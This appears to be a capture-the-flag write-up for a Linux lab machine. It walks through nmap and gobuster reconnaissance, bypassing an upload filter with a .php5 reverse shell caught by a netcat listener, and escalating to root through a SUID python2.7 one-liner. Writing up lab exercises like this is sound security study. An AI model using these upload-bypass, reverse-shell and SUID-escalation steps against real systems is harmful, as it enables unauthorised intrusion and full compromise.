## Summary

Linux machine vulnerable to file upload filter bypass (.php5 extension), 
leading to RCE as www-data. Privilege escalation via SUID misconfiguration 
on python2.7.

---

## Reconnaissance

### Nmap scan

```bash
nmap -sC -sV -oN nmap_rootme.txt 10.114.155.255
```

**Open ports:**

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.2p1 |
| 80 | HTTP | Apache 2.4.41 |

### Gobuster

```bash
gobuster dir -u http://10.114.155.255 -w /usr/share/wordlists/dirb/common.txt
```

**Interesting directories:**
- `/panel` — file upload form
- `/uploads` — where uploaded files are stored

---

## Exploitation

### File upload filter bypass

The `/panel` page blocks `.php` files — error: "PHP não é permitido".  
Bypass: rename the file to `.php5` — accepted successfully.

```bash
cp ~/shell.php ~/shell.php5
# edit $ip and $port in the file
# upload shell.php5 to /panel
```

Started listener:
```bash
nc -lvnp 4444
```

Triggered shell by visiting:
````

[http://10.114.155.255/uploads/shell.php5](http://10.114.155.255/uploads/shell.php5)

````

**Result:** Shell as `www-data`

---

## Privilege Escalation

### SUID enumeration

```bash
find / -perm -4000 2>/dev/null
```

**Weird file found:** `/usr/bin/python2.7` — SUID on Python is abnormal.

### Exploit

```bash
python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**Result:** Root shell ✅
